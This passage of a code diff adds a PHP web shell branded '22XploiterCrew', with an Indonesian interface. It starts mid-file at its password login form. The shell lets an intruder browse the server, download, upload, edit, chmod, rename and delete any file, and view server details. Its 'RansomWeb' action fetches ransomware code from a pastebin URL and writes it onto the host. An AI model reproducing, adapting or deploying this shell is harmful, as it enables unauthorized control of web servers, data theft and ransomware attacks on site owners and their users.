+							<input type="password" name="pass" placeholder="ANDA TAU PASSWORD? TAROK LA SINI" class="form-control"><br/>
+							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="CROTTT">
+						</form>
+					</div>
+				</div><br/>
+			</div>
+		</center>
+	</body>
+</html>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        login_shell();
+if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+		<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.75, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
+  <!-- Custom styles for this template -->
+  <style>
+body {
+  overflow-x: hidden;
+}
+.ico {width:20px;}
+.ico2{width:20px;}
+#sidebar-wrapper {
+  min-height: 100vh;
+  margin-left: -15rem;
+  -webkit-transition: margin .25s ease-out;
+  -moz-transition: margin .25s ease-out;
+  -o-transition: margin .25s ease-out;
+  transition: margin .25s ease-out;
+}
+
+#sidebar-wrapper .sidebar-heading {
+  padding: 0.875rem 1.25rem;
+  font-size: 1.2rem;
+}
+
+#sidebar-wrapper .list-group {
+  width: 15rem;
+}
+
+#page-content-wrapper {
+  min-width: 100vw;
+}
+
+#wrapper.toggled #sidebar-wrapper {
+  margin-left: 0;
+}
+
+@media (min-width: 768px) {
+  #sidebar-wrapper {
+    margin-left: 0;
+  }
+
+  #page-content-wrapper {
+    min-width: 0;
+    width: 100%;
+  }
+
+  #wrapper.toggled #sidebar-wrapper {
+    margin-left: -15rem;
+  }
+}
+  </style>
+</head>
+<body>
+
+ 
+    <!-- /#sidebar-wrapper -->
+
+    <!-- Page Content -->
+    <div id="page-content-wrapper">
+
+      <nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
+        <button class="btn btn-primary" id="menu-toggle"><i class="fa fa-user"></i></button>
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
+            <li class="nav-item active">
+              <a class="nav-link" href="?">Home <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+             
+<?php
+if(isset($_GET['path'])){
+$path = $_GET['path'];
+}else{
+$path = getcwd();
+}
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
+
+foreach( $paths as $id => $pat ){
+if( $pat == '' && $id == 0 ){
+$a = true;
+echo 'Current Dir => <a href="?path=/">/</a>';
+continue;
+}
+if( $pat == '' ) continue;
+echo '<a href="?path=';
+for( $i = 0; $i <= $id; $i++){
+echo "$paths[$i]";
+if( $i != $id ) echo "/";
+}
+echo '">'.$pat.'</a>/';
+}
+?>
+             
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Informasi & Upload
+              </a>
+              <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown">
+                <a class="dropdown-item" href="?info">Info Server</a>
+                <div class="dropdown-divider"></div>
+                <center>
+               <form method="post" enctype="multipart/form-data">
+               	<input type="file" name="file"><input type="submit" name="upload" value="Upload">
+               </form>
+               </center>
+              </div>
+            </li>
+          </ul>
+        </div>
+      </nav>
+ <div class="d-flex" id="wrapper">
+    <!-- Sidebar -->
+    <div class="bg-light border-right" id="sidebar-wrapper">
+      <div class="sidebar-heading"><i class="fas fa-tachometer-alt"></i><a href="?" class="text-dark"> 22XploiterCrew</a></div>
+      <div class="list-group list-group-flush">
+      	<?php
+      	echo "<a href='?path=$path&aksi=buatfolder' class='list-group-item list-group-item-action bg-light'><i class='fas fa-folder-open'></i> Buat Folder</a>
+      	<a href='?path=$path&aksi=buatfile' class='list-group-item list-group-item-action bg-light'><i class='fas fa-file'></i> Buat File</a>
+      	<a href='?path=$path&aksi=ransom' class='list-group-item list-group-item-action bg-light'><i class='fa fa-exclamation-triangle'></i> RansomWeb</a>";
+      	?>
+        <a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> Logout</a>
+        
+      </div>
+    </div>
+      <div class="container-fluid">
+        
+        
+<?php
+if($_GET["keluar"] == true){
+unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
+	echo "<script>window.location='?';</script>";
+}
+if($_GET['aksi'] == 'buatfolder'){
+	function hai(){
+		echo "<script>window.location='?path=".$path."'; alert('Folder Sukses Dibuat!')</script>";
+	}
+	if(isset($_POST["folderss"])){
+		$nama_folder = $path.'/'.$_POST["namaF"];
+		mkdir($nama_folder,hai());
+	}
+		
+	echo '
+	<div class="row mt-3">
+		<div class="col">
+			<form method="post">
+	<input type="text" name="namaF" class="form-control mb-3" placeholder="Nama Folder">
+		</div>
+		<div class="col">
+			<input type="submit" class="btn btn-outline-primary btn-block" value="Buat" name="folderss"></form>
+				</div>
+				</div>';
+}elseif($_GET["aksi"] == 'ransom'){
+	
+	
+// Ubah Link ransomnya jika ingin ganti ransomware yangvlain
+	$url  = "https://pastebin.com/raw/LbVhNnZF";
+  $curl = curl_init($url);
+  				curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
+  $get	= curl_exec($curl);
+ if(!$get == ""){ // Jika isi file dari url tidak kosong
+// Buat file
+$puts = fopen("RansomWeb.php","w");
+				fwrite($puts,$get);
+				fclose($puts);
+$nama_file  = "RansomWeb.php";
+$server_web = 'http://'.$_SERVER["HTTP_HOST"].'/';
+if($puts == true){
+	echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
+}else{
+	echo "Gagal Membuat File";
+	}
+}else{
+	echo "Not Found!!";
+}
+
+	
+}elseif($_GET["aksi"] == 'buatfile'){
+	if(isset($_POST["buat"])){
+	$namaF = $path.'/'.$_POST["nama_file"];
+	$isi = $_POST["isi"];
+	$buat = fopen($namaF,"w");
+	fwrite($buat,$isi);
+	fclose($buat);
+	if($buat == TRUE){
+		echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+}
+echo '<form method="post" class="mt-3">
+	<input type="text" class="form-control mb-3" placeholder="Nama File" name="nama_file">
+		<textarea class="form-control mb-3" rows="8" name="isi" placeholder="Isi File"></textarea>
+		<input type="submit" name="buat" class="btn btn-outline-primary" value="Buat">';
+}else
+
+// Informasi Server
+
+if(isset($_GET["info"])){
+echo '
+	<div class="alert alert-success mt-3">
+		<h3 class="text-center">Informasi Server</h3><hr>
+		<li>Nama Server : '.$_SERVER["SERVER_NAME"].'</li>
+		<li>Ip Address : '.$_SERVER["SERVER_ADDR"].'</li>
+		<li>Port : '.$_SERVER["SERVER_PORT"].'</li>
+		<li>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</li>
+		<li>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</li>
+		<li>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</li>
+		<li>Software : '.$_SERVER["SERVER_SOFTWARE"].'</li>
+		<li>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</li>
+		<li>G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].'</li>
+		<li>R-Method : '.$_SERVER["REQUEST_METHOD"].'</li>
+		<li>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</li>
+		</div>';
+}else if(isset($_FILES['file'])){
+if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
+echo "<script>window.location='?path=".$path."'; alert('Valid!!')</script>";
+}else{
+echo "<script>alert('Gagal Upload')</script>";
+}
+}else if(isset($_GET['filesrc'])){
+echo "<tr><td>Current File : ";
+echo $_GET['filesrc'];
+echo '</tr></td></table><br />';
+echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
+}else if(isset($_GET['option']) && $_POST['opt'] != 'delete'){
+echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
+if($_POST['opt'] == 'chmod'){
+if(isset($_POST['perm'])){
+if(chmod($_POST['path'],$_POST['perm'])){
+echo "<script>window.location='?path=".$path."'; alert('Sukses')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+}
+echo '<form method="POST">
+	<div class="row">
+		<div class="col">
+<input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" class="form-control">
+	</div>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="chmod">
+	<div class="col">
+<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
+</form>';
+}else if($_POST['opt'] == 'rename'){
+if(isset($_POST['newname'])){
+if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+echo "<script>window.location='?path=".$path."'; alert('Nama Telah Diubah!')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+$_POST['name'] = $_POST['newname'];
+}
+echo '<form method="POST">
+	<div class="row">
+		<div class="col">
+<input name="newname" type="text" size="20" value="'.$_POST['name'].'" class="form-control" placeholder="Nama Baru">
+	</div>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="rename">
+	<div class="col">
+<input type="submit" value="Go" class="btn btn-outline-primary btn-block">
+</div>
+</div>
+</form>';
+}else if($_POST['opt'] == 'edit'){
+if(isset($_POST['src'])){
+$fp = fopen($_POST['path'],'w');
+if(fwrite($fp,$_POST['src'])){
+echo "<script>window.location='?path=".$path."'; alert('Berhasil Merubah Nama File')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+fclose($fp);
+}
+echo '<form method="POST">
+<textarea class="form-control" rows="8" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
+<input type="hidden" name="path" value="'.$_POST['path'].'">
+<input type="hidden" name="opt" value="edit">
+<input type="submit" value="Simpan" class="btn btn-outline-primary btn-block mt-3">
+</form>';
+}
+echo '</center>';
+}else{
+echo '</table><br/><center>';
+if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
+if($_POST['type'] == 'dir'){
+if(rmdir($_POST['path'])){
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus Folder')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+}else if($_POST['type'] == 'file'){
+if(unlink($_POST['path'])){
+echo "<script>window.location='?path=".$path."'; alert('Sukses Menghapus File')</script>";
+}else{
+echo "<script>window.location='?path=".$path."'; alert('Gagal!!!')</script>";
+}
+}
+}
+echo '</center>';
+$scandir = scandir($path);
+echo '
+<div class="table-responsive-lg mt-2">
+	<table class="table table-hover">
+		<thead class="bg-warning text-center">
+			<tr>
+				<th scope="col">Nama</th>
+				<th scope="col">Jenis</th>
+				<th scope="col">Ukuran</th>
+				<th scope="col">Perizinan</th>
+				<th scope="col">Aksi</th></tr></thead>
+	';
+	foreach($scandir as $dir){
+if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
+echo '<tr>
+<td scope="col"><img src="http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" class="ico"> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td class="text-center">Folder</td>
+<td class="text-center">--</td>
+<td class="text-center">';
+if(is_writable($path.'/'.$dir)) echo '<font color="green">';
+elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
+echo perms($path.'/'.$dir);
+if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
+
+echo '</td>
+<td class="text-center"><form method="POST" action="?option&path='.$path.'">
+	<div class="row">
+		<div class="col">
+<select name="opt" class="custom-select">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+</select>
+</div>
+<input type="hidden" name="type" value="dir">
+<input type="hidden" name="name" value="'.$dir.'">
+<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
+	<div class="col">
+<input type="submit" value=">" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
+</form></td>
+</tr>';
+}
+foreach($scandir as $file){
+if(!is_file($path.'/'.$file)) continue;
+$size = filesize($path.'/'.$file)/1024;
+$size = round($size,3);
+if($size >= 1024){
+$size = round($size/1024,2).' MB';
+}else{
+$size = $size.' KB';
+}
+
+echo '<tr>
+<td><img src="';
+					$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+					if($ext == "php") {
+						echo 'https://image.flaticon.com/icons/png/128/337/337947.png"';
+					}elseif ($ext == "html") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136528.png"';
+					}elseif ($ext == "css") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136527.png"';
+					}elseif ($ext == "png") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136523.png"';
+					}elseif ($ext == "jpg") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136524.png"';
+					}elseif ($ext == "jpeg") {
+						echo 'http://i.imgur.com/e8mkvPf.png"';
+					}elseif($ext == "zip") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136544.png"';
+					}elseif ($ext == "js") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
+					}elseif ($ext == "ttf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
+					}elseif ($ext == "otf") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
+					}elseif ($ext == "txt") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
+					}elseif ($ext == "ico") {
+						echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
+					}elseif ($ext == "conf") {
+						echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
+					}elseif ($ext == "htaccess") {
+						echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
+					}elseif ($ext == "sh") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
+					}elseif ($ext == "py") {
+						echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
+					}elseif ($ext == "sql") {
+						echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
+					}elseif ($ext == "pl") {
+						echo 'http://i.imgur.com/PnmX8H9.png';
+					}elseif ($ext == "pdf") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
+					}elseif ($ext == "mp4") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
+					}elseif ($ext == "mp3") {
+						echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
+					}elseif ($ext == "git") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
+					}elseif ($ext == "md") {
+						echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
+					}else{
+						echo 'http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png';
+					}
+					echo '" class="ico2"> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td class="text-center">File</td>
+<td class="text-center">'.$size.'</td>
+<td class="text-center">';
+if(is_writable($path.'/'.$file)) echo '<font color="green">';
+elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
+echo perms($path.'/'.$file);
+if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
+echo '</td>
+<td class="text-center">
+	<form method="POST" action="?option&path='.$path.'">
+		<div class="row">
+			<div class="col">
+<select name="opt" class="custom-select">
+<option value="">Select</option>
+<option value="delete">Delete</option>
+<option value="chmod">Chmod</option>
+<option value="rename">Rename</option>
+<option value="edit">Edit</option>
+</select>
+</div>
+<input type="hidden" name="type" value="file">
+<input type="hidden" name="name" value="'.$file.'">
+<input type="hidden" name="path" value="'.$path.'/'.$file.'">
+	<div class="col">
+<input type="submit" value="OK" class="btn btn-outline-primary btn-block">
+	</div>
+	</div>
+</form></td>
+</tr>';
+}
+echo '</table>
+</div>';
+}
+?>
+        
+        
+      </div>
+    </div>
+    <!-- /#page-content-wrapper -->
+  </div>
+  <!-- /#wrapper -->
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+
+  <!-- Menu Toggle Script -->
+  <script>
+    $("#menu-toggle").click(function(e) {
+      e.preventDefault();
+      $("#wrapper").toggleClass("toggled");
+    });
+  </script>
+
+</body>
+</html>
+<?php
+function perms($file){
+$perms = fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) {
+// Socket
+$info = 's';
+} elseif (($perms & 0xA000) == 0xA000) {
+// Symbolic Link
+$info = 'l';
+} elseif (($perms & 0x8000) == 0x8000) {
+// Regular
+$info = '-';
+} elseif (($perms & 0x6000) == 0x6000) {
+// Block special
+$info = 'b';
+} elseif (($perms & 0x4000) == 0x4000) {
+// Directory
+$info = 'd';
+} elseif (($perms & 0x2000) == 0x2000) {
+// Character special
+$info = 'c';
+} elseif (($perms & 0x1000) == 0x1000) {
+// FIFO pipe
+$info = 'p';
+} else {
+// Unknown
+$info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+(($perms & 0x0800) ? 's' : 'x' ) :
+(($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+(($perms & 0x0400) ? 's' : 'x' ) :
+(($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+(($perms & 0x0200) ? 't' : 'x' ) :
+(($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+?>
